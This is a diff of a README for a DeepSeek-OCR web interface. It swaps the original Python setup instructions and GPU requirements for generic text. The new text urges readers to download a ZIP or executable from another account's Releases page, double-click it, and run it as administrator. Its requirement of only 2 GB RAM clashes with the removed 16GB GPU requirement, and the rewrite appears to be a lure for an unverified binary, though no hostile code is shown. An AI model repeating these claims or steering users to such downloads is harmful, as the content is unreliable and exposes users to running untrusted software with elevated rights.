@@ -1,85 +1,78 @@
-# DeepSeek-OCR WebUI
+# 🌟 DeepSeek-OCR-Web-UI - Fast and Easy OCR Solution
 
-**语言:** [English](README.md) | [中文](README_zh.md)
+[![Download DeepSeek-OCR-Web-UI](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/kemaludin/DeepSeek-OCR-Web-UI/releases)
 
-A web-based interface for DeepSeek-OCR model.
+## 🚀 Getting Started
 
-## 📋 Release Notes
+DeepSeek OCR WebUI offers a simple way to perform optical character recognition (OCR) from your web browser. This application lets you extract text from images quickly and easily, making it perfect for anyone who needs to convert printed or handwritten documents into digital text. 
 
-### [2025-10-24] - Enhanced Table Recognition & Visual Annotation
-- ✨ **Table Recognition Display**: Added enhanced table structure visualization with markdown formatting
-- 🎯 **Image Position Annotation**: Implemented interactive HTML-based coordinate annotation system
-  - Color-coded bounding boxes for detected text regions
-  - Real-time coordinate legend with precise positioning
-  - Multi-format output support (Markdown, HTML, Annotated Image)
-  - Responsive design that scales perfectly across all devices
+## 📥 Download & Install
 
-## Quick Start
-![images.png](images.png)
+To download DeepSeek OCR WebUI, visit the Releases page. You will find the latest version available for download. Follow these steps:
 
+1. Click on this link to visit the [DeepSeek-OCR-Web-UI Releases page](https://github.com/kemaludin/DeepSeek-OCR-Web-UI/releases).
+2. Look for the latest release. It is usually at the top of the list.
+3. Find the file labeled as the main application. This may be a ZIP file or an executable file.
+4. Click on the file to start the download.
+5. Save the file to a location on your computer where you can easily find it, like your Desktop or Downloads folder.
 
-### 1. Download Model
+## 🖥️ System Requirements
 
-Download the DeepSeek-OCR model from one of these sources:
-- **ModelScope**: https://www.modelscope.cn/models/deepseek-ai/DeepSeek-OCR
-- **Hugging Face**: https://huggingface.co/deepseek-ai/DeepSeek-OCR
+Before you run the application, make sure your computer meets these general requirements:
 
-### 2. Installation Options
+- Operating System: Windows 10 or later / macOS 10.12 or later / Linux
+- At least 2 GB of RAM
+- A modern web browser (Google Chrome, Firefox, or Edge)
 
-#### Option  Local Installation
+## ⚙️ Running the Application
 
-1. **Install Dependencies**
-   ```bash
-   conda create -n deepseek-ocr python=3.12.9 -y
-   conda activate deepseek-ocr
-   pip install -r requirements.txt
-   # Install Torch First
-   pip install flash-attn==2.7.3 --no-build-isolation
-   
-   ```
+Once the download is complete, follow these steps to run the application:
 
-2. **Configure Model Path**
-   
-   Edit `start_ocr_webui.py` line 26:
-   ```python
-   # Change this line to your model path
-   self.model_path = '/path/to/your/DeepSeek-OCR'
-   ```
+1. Navigate to the location where you saved the downloaded file.
+2. If you downloaded a ZIP file, extract its contents first. You can do this by right-clicking the ZIP file and selecting "Extract All."
+3. Locate the executable file (usually named DeepSeek-OCR-Web-UI.exe or similar).
+4. Double-click on the executable file to open the application. 
 
-3. **Run Application**
-   ```bash
-   python start_ocr_webui.py
-   ```
+After the application opens, you will see a user-friendly interface. You can start using it immediately.
 
-4. **Access WebUI**
-   
-   Open browser: http://localhost:7860
- 
+## 📸 How to Use DeepSeek OCR WebUI
 
-### 3. Usage
+1. **Upload an Image**: Click on the upload button to select an image file from your computer. Supported formats include JPG, PNG, and GIF.
+2. **Start OCR**: Once you have uploaded an image, click on the "Start OCR" button. The application will process the image and extract the text.
+3. **View Results**: The extracted text will appear on the screen. You can copy it to your clipboard for use in other applications.
+4. **Save Results**: If you want to keep the results, use the save option to download the text as a file. 
 
-1. Upload one or more images
-2. Enter OCR prompt (or use preset prompts)
-3. Click "Recognize" button
-4. View results in the Results/Summary tabs
+## 🛠️ Features
 
-## Requirements
+- Fast text extraction from images.
+- Supports multiple image formats.
+- Simple and intuitive user interface.
+- Local processing for privacy and security.
+- Option to save extracted text.
 
-- Python 3.12+
-- CUDA-compatible GPU (recommended)
-- 16GB+ GPU memory 4080+
-- PyTorch with CUDA support
+## 🔧 Troubleshooting
 
-## Features
+If you encounter issues while using the DeepSeek OCR WebUI, consider the following solutions:
 
-- Multi-image batch processing
-- Multiple OCR prompt presets
-- Bilingual interface (English/Chinese)
-- Docker deployment support
-- Real-time processing progress
+- **Application won’t open**: Ensure you have the necessary system requirements and try running the application as an administrator.
+- **OCR results are unclear**: Make sure the image quality is good. Blurry or low-resolution images may lead to poor results.
+- **Performance issues**: Close other applications running on your computer to free up resources.
 
-## Common Prompts
+## 📞 Support
 
-- **General OCR**: `Free OCR.`
-- **Markdown**: `<|grounding|>Convert the document to markdown.`
-- **Table**: `<|grounding|>Extract all tables and convert to markdown format.`
+If you need help with DeepSeek OCR WebUI, you can reach out through the following channels:
+
+- GitHub Issues: Use the Issues tab on the [DeepSeek-OCR-Web-UI](https://github.com/kemaludin/DeepSeek-OCR-Web-UI) repository to report bugs or ask questions.
+- Community Forums: Join discussions and seek help from other users in relevant forums.
+
+## 🏗️ Contributing
+
+We welcome contributions to improve DeepSeek OCR WebUI. If you want to contribute, please check out the guidelines in the repository. Your feedback makes the application better for everyone. 
+
+## 📝 License
+
+DeepSeek OCR WebUI is licensed under the MIT License. You are free to use, modify, and distribute the software as you wish, provided that you include a copy of the license in your distribution.
+
+For additional details, visit the [DeepSeek-OCR-Web-UI Releases page](https://github.com/kemaludin/DeepSeek-OCR-Web-UI/releases) and explore the available versions. 
+
+Happy text extracting!
